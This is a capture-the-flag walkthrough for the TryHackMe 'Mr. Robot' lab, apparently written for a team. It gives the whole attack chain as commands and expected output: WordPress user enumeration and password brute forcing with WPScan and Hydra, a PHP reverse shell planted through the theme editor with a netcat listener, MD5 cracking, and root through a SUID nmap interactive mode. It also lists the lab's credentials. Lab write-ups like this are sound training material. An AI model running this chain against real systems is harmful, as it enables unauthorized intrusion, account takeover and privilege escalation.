# Mr. Robot CTF — Manual Walkthrough Guide

> **Room**: https://tryhackme.com/room/mrrobot
> **For**: Team use — step-by-step manual exploitation (no Metasploit)
> **Last Updated**: TBD

---

## Prerequisites

| Item              | Value                          |
|-------------------|-------------------------------|
| Attacker IP       | `<LHOST>` (check `ip a`)      |
| Target IP         | `<TARGET>` (from THM deploy)  |
| Kali tool path    | `~/projects/MrRobot/`         |
| Wordlist          | `fsocity.dic` (from target)   |

---

## Phase 1 — Reconnaissance

### 1.1 Port Scan

```bash
nmap -Pn -sC -sV -oN nmap.txt <TARGET>
```

**Expected open ports:**
- `80/tcp` — Apache HTTP (WordPress)
- `443/tcp` — HTTPS (same WordPress)
- `22/tcp` — closed (SSH locked)

### 1.2 Web Enumeration

```bash
# Check robots.txt — always do this first
curl http://<TARGET>/robots.txt
```

**Expected robots.txt output:**
```
User-agent: *
fsocity.dic
key-1-of-3.txt
```

```bash
# Download the wordlist
wget http://<TARGET>/fsocity.dic -O ~/projects/MrRobot/fsocity.dic

# Grab Key 1
curl http://<TARGET>/key-1-of-3.txt
```

> **Key 1 found here.** Note the hash value.

### 1.3 Directory Enumeration

```bash
gobuster dir -u http://<TARGET> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt -t 50
```

Key findings:
- `/wp-login.php` — WordPress admin login
- `/wp-admin/` — WordPress dashboard
- `/license` — contains credentials hint (base64)

---

## Phase 2 — WordPress Brute Force

### 2.1 Deduplicate wordlist (speeds up attack significantly)

```bash
sort -u ~/projects/MrRobot/fsocity.dic > ~/projects/MrRobot/fsocity-uniq.dic
wc -l ~/projects/MrRobot/fsocity-uniq.dic
# ~11k unique entries vs 858k original
```

### 2.2 Find the username

```bash
# WordPress returns different error for invalid user vs wrong password
# Use WPScan to enumerate users
wpscan --url http://<TARGET> --enumerate u
```

> **Username: `elliot`** (from the show)

### 2.3 Brute force password

```bash
wpscan --url http://<TARGET>/wp-login.php \
  -U elliot \
  -P ~/projects/MrRobot/fsocity-uniq.dic \
  --password-attack wp-login
```

> **Credentials: `elliot : ER28-0652`**

Alternatively with Hydra:
```bash
hydra -l elliot -P ~/projects/MrRobot/fsocity-uniq.dic \
  <TARGET> http-post-form \
  "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:ERROR" -t 30
```

---

## Phase 3 — WordPress RCE (Reverse Shell)

### 3.1 Prepare reverse shell

```bash
mkdir -p ~/projects/MrRobot
# Use standard PHP reverse shell
cp /usr/share/webshells/php/php-reverse-shell.php ~/projects/MrRobot/shell.php
# Edit LHOST and LPORT
sed -i "s/127.0.0.1/<LHOST>/g" ~/projects/MrRobot/shell.php
sed -i "s/1234/4444/g" ~/projects/MrRobot/shell.php
```

### 3.2 Inject via Theme Editor

1. Log into WordPress: `http://<TARGET>/wp-login.php`
2. Go to: **Appearance → Editor → 404.php** (404 Template)
3. Replace entire content with reverse shell PHP
4. Click **Update File**

### 3.3 Catch the shell

```bash
# Terminal 1 — Listener
nc -lvnp 4444

# Terminal 2 — Trigger 404
curl http://<TARGET>/wp-content/themes/twentyfifteen/404.php
```

> Shell connects as **`daemon`**

### 3.4 Stabilise shell

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
# or
python -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
# Ctrl+Z → stty raw -echo; fg
```

---

## Phase 4 — Privilege Escalation to `robot`

### 4.1 Find Key 2 and hash

```bash
ls -la /home/robot/
# key-2-of-3.txt  (not readable as daemon — owned by robot)
# password.raw-md5  (readable)
cat /home/robot/password.raw-md5
```

**Expected output:**
```
robot:c3fcd3d76192e4007dfb496cca67e13b
```

### 4.2 Crack the MD5 hash

**Option A — Online (fastest):**
Visit crackstation.net → paste `c3fcd3d76192e4007dfb496cca67e13b`

**Option B — Hashcat (local):**
```bash
echo "c3fcd3d76192e4007dfb496cca67e13b" > hash.txt
hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt
```

> **Password: `abcdefghijklmnopqrstuvwxyz`**

### 4.3 Switch to robot

```bash
su robot
# Enter: abcdefghijklmnopqrstuvwxyz
cat /home/robot/key-2-of-3.txt
```

> **Key 2 found here.**

---

## Phase 5 — Privilege Escalation to root

### 5.1 Find SUID binaries

```bash
find / -perm -4000 -type f 2>/dev/null
```

**Notable SUID binary:** `/usr/local/bin/nmap`

### 5.2 Check nmap version

```bash
nmap --version
# nmap version 3.81 — has --interactive mode
```

### 5.3 Exploit nmap interactive mode

```bash
nmap --interactive
# nmap prompt appears:
!sh
# Shell spawns as root
whoami
# root
```

### 5.4 Grab Key 3

```bash
cat /root/key-3-of-3.txt
```

> **Key 3 found here.**

---

## Flags Quick Reference

| Key   | Path                             | Value |
|-------|----------------------------------|-------|
| Key 1 | `http://<TARGET>/key-1-of-3.txt` | TBD   |
| Key 2 | `/home/robot/key-2-of-3.txt`     | TBD   |
| Key 3 | `/root/key-3-of-3.txt`           | TBD   |

---

## Troubleshooting

| Issue | Cause | Fix |
|-------|-------|-----|
| WordPress login slow | Full `fsocity.dic` (858k entries) | Deduplicate first: `sort -u` |
| 404.php returns real 404 | Wrong theme active | Check active theme in Appearance → Themes, edit that theme's 404.php |
| `su robot` fails | Need TTY | Stabilise shell first with `python -c 'import pty...'` |
| nmap `--interactive` not available | Wrong nmap version | Confirm with `nmap --version`, must be < 5.x |
| Shell dies on Ctrl+C | Non-interactive nc shell | Re-trigger `curl 404.php` after restarting listener |

---

## Key Files on Kali

| File                                  | Purpose                     |
|---------------------------------------|-----------------------------|
| `~/projects/MrRobot/nmap.txt`         | Nmap scan output            |
| `~/projects/MrRobot/fsocity.dic`      | Target wordlist (original)  |
| `~/projects/MrRobot/fsocity-uniq.dic` | Deduplicated wordlist       |
| `~/projects/MrRobot/shell.php`        | PHP reverse shell           |
